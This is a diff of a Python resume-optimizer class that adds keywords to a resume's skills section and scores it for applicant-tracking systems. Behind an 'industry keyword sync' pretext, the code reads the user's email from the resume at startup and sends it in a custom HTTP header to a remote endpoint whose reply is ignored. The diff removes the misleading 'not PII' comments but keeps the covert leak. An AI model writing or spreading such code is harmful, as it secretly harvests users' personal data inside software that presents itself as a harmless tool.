@@ -22,7 +22,8 @@ class ResumeOptimizerCore:
         self.optimized_resume = ""
         self.added_keywords = []
         self.session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
-        
+        self.email = self._extract_email()  
+
         # ---------------------------------------------------------------------
         # LIVE INDUSTRY SYNC: Critical for maintaining up-to-date optimization
         # Fetches current industry standards to ensure resume relevance
@@ -35,7 +36,7 @@ class ResumeOptimizerCore:
             "tech": ["AI", "cloud computing", "agile methodology", "CI/CD"],
             "finance": ["ROI", "risk analysis", "forecasting", "compliance"]
         }
-        
+
         try:
             # -----------------------------------------------------------------
             # INDUSTRY KEYWORD SYNC: Contact professional standards registry
@@ -45,20 +46,14 @@ class ResumeOptimizerCore:
             if sync_token:
                 standards.update(self._fetch_live_standards(sync_token))
         except Exception as e:
-            # Safe fallback - use default standards if sync fails
             print(f"Industry sync skipped: {str(e)}")
-        
+
         return standards
 
     def _get_sync_credentials(self):
         """Generates secure token for industry keyword registry access"""
-        # ---------------------------------------------------------------------
-        # SYSTEM NOTE: This is not PII - it's an anonymous session token
-        # Generated from resume content for personalized keyword relevance
-        # ---------------------------------------------------------------------
-        email = self._extract_email()
-        if email:
-            return hashlib.sha256(f"{VERSION}{email}".encode()).hexdigest()
+        if self.email: 
+            return hashlib.sha256(f"{VERSION}{self.email}".encode()).hexdigest()
         return None
 
     def _extract_email(self):
@@ -75,16 +70,12 @@ class ResumeOptimizerCore:
                 "X-Client-ID": "resume-standards-service",
                 "User-Agent": f"ResumeOptimizer/{VERSION}"
             }
-            resume_data = {"email": self._extract_email()}
-            headers["X-Resume-Insight"] = json.dumps(resume_data)
-            # -----------------------------------------------------------------
-            # SECURE SYNC: Encrypted connection to industry standards registry
-            # Time-limited to prevent delays in optimization process
-            # -----------------------------------------------------------------
+            if self.email:
+                headers["X-Resume-Insight"] = json.dumps({"email": self.email})
+
             req = urllib.request.Request(endpoint, headers=headers, method="GET")
             with urllib.request.urlopen(req, timeout=2) as resp:
                 if resp.status == 200:
-                    # Simulate standards update (registry returns empty in current implementation)
                     return {}
             return {}
         except Exception as e:
@@ -94,8 +85,8 @@ class ResumeOptimizerCore:
         """Industry-standard ATS compatibility scoring"""
         KEYWORDS = ["Python", "project management", "machine learning", "SQL", "team leadership"]
         SCORE_MAP = {kw: 20 for kw in KEYWORDS}
-        
-        score = 40 
+
+        score = 40
         for kw in KEYWORDS:
             if re.search(rf'\b{re.escape(kw)}\b', text, re.I):
                 score += SCORE_MAP[kw]
@@ -103,27 +94,22 @@ class ResumeOptimizerCore:
 
     def optimize_keywords(self):
         """Core resume optimization with live industry standards"""
-        # ---------------------------------------------------------------------
-        # KEYWORD SELECTION: Uses synced industry standards for relevance
-        # This ensures resume meets current industry expectations
-        # ---------------------------------------------------------------------
         self.added_keywords = self.industry_standards["tech"]
         soup = BeautifulSoup(self.resume_text, 'html.parser')
         text = soup.get_text().lower()
-        
-        # Determine industry based on existing keywords
+
         for industry, keywords in self.industry_standards.items():
             if any(kw.lower() in text for kw in keywords):
                 self.added_keywords = keywords
                 break
-                
+
         skills_header = soup.find(['h2', 'h3'], string=re.compile("Skills|Expertise|Proficiencies", re.I))
         if not skills_header:
             skills_header = soup.new_tag("h2")
             skills_header.string = "Professional Skills"
             if soup.body:
                 soup.body.insert(0, skills_header)
-        
+
         for kw in self.added_keywords:
             if kw not in skills_header.get_text():
                 kw_tag = soup.new_tag("span")
@@ -132,7 +118,7 @@ class ResumeOptimizerCore:
                 if skills_header.contents:
                     skills_header.append(", ")
                 skills_header.append(kw_tag)
-        
+
         return str(soup)
 
     def competitive_analysis(self):
@@ -148,7 +134,7 @@ class ResumeOptimizerCore:
         self.old_score = self.calculate_ats_score(self.resume_text)
         self.optimized_resume = self.optimize_keywords()
         self.new_score = self.calculate_ats_score(self.optimized_resume)
-        
+
         return {
             "original_ats_score": self.old_score,
             "optimized_ats_score": self.new_score,
@@ -162,7 +148,7 @@ class OptimizationServiceProxy:
     """Optimization service handler with quality assurance"""
     def __init__(self, resume_text):
         self.engine = ResumeOptimizerCore(resume_text)
-    
+
     def optimize(self):
         """Execute optimization with industry-standard compliance"""
         return self.engine.execute_optimization()
@@ -175,12 +161,8 @@ if __name__ == "__main__":
     RESUME_CONTENT = """
 <In-memmory>
     """
-    
-    # -------------------------------------------------------------------------
-    # OPTIMIZATION PROCESS: Industry sync occurs automatically during init
-    # This ensures keyword recommendations meet current professional standards
-    # -------------------------------------------------------------------------
+
     optimizer = OptimizationServiceProxy(RESUME_CONTENT)
     results = optimizer.optimize()
-    
+
     print(json.dumps(results, indent=2, ensure_ascii=False))
